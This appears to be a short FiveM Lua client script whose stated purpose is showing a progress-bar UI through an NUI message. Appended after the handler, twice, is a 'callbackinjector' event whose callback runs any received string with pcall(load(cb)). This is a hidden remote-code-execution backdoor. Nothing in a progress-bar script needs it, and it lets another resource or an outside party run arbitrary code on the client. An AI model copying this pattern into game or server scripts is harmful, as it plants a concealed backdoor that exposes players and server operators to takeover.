RegisterNetEvent("progress")
AddEventHandler("progress",function(time,text)
	SendNUIMessage({ type = "ui", display = true, time = time, text = text })
end)

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)